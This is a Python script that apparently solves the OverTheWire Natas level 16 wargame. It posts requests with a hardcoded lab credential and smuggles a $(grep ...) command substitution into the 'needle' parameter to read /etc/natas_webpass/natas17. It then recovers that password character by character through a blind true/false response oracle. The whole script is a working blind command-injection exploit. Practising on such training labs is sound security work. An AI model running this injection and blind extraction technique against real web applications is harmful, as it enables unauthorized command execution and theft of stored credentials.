from requests import post
from requests.auth import HTTPBasicAuth
from string import ascii_letters, digits

word = "intelligence"
charset = ascii_letters + digits
filtered = ''
password = ''

def makeRequest(url):
  return   post(
    url = url,
    auth = HTTPBasicAuth("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")
  )

def url(grepargs):
  base = "http://natas16.natas.labs.overthewire.org/index.php"
  return base + f"?needle={word}$(grep {grepargs} /etc/natas_webpass/natas17)"


for char in charset:
  r = makeRequest(url(char))
  if word not in r.text: 
    filtered += char

for i in range(0, 32):
  for char in filtered:
    r = makeRequest(url(f"^{password + char}"))
    if word not in r.text:
      password += char
      break
print(password)